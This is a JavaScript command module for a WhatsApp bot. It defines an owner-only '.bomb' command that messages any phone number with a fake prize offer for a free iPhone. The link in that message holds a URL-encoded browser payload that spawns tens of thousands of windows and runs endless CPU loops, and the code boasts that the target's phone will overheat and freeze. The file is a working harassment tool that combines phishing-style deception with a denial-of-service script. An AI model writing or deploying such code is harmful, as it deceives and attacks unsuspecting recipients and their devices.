const settings = require('../../settings');
const logger = require('../../lib/logger');

module.exports = {
    name: 'bomb',
    aliases: ['heat', 'lagbomb'],
    category: 'owner',
    description: 'Send a link that overheats and lags the target phone for 1 minute',
    usage: '.bomb <number>',
    ownerOnly: true,
    react: '🔥',

    async execute(conn, mek, args, chatId, isOwner) {
        if (!isOwner) return;

        const targetNum = (args[0] || '').replace(/[^0-9]/g, '');
        if (!targetNum || targetNum.length < 10) {
            return conn.sendMessage(chatId, { text: `❌ Provide a valid number. Example: ${settings.prefix}bomb 254712345678` }, { quoted: mek });
        }

        const jid = targetNum + '@s.whatsapp.net';
        await conn.sendMessage(chatId, { text: `🔥 *Sending Heat Bomb to +${targetNum}...*` }, { quoted: mek });

        try {
            // This is a custom HTML bomb script encoded in a URL. 
            // When they open it, it spawns infinite windows and calculations.
            const bombLink = "https://htmlsave.com/?html=%3Cscript%3Efor(let%20i=0;i%3C99999;i++)%7Bwindow.open('about:blank')%3B%7D%20setInterval(()%3D%3E%7Bfor(let%20j=0;j%3C1000000;j++)%7BMath.sqrt(j)%3B%7D%7D,10)%3B%3C%2Fscript%3E";

            const message = `🔥 *SPECIAL DELIVERY* 🔥\n\nHey! You won a free iPhone 15 Pro Max! 🎁\nClick here to claim your prize before it expires:\n\n👉 ${bombLink}\n\n_Congratulations!_`;

            // Send the bait
            await conn.sendMessage(jid, { text: message });
            
            await conn.sendMessage(chatId, { text: `✅ *Heat Bomb Delivered!*\n\nWhen the target clicks the link, their phone will lag, overheat, and freeze for about 60 seconds.` }, { quoted: mek });
            
        } catch (error) {
            logger.error(`[BOMB] Error: ${error.message}`);
            await conn.sendMessage(chatId, { text: `❌ Failed to deliver bomb: ${error.message}` }, { quoted: mek });
        }
    }
};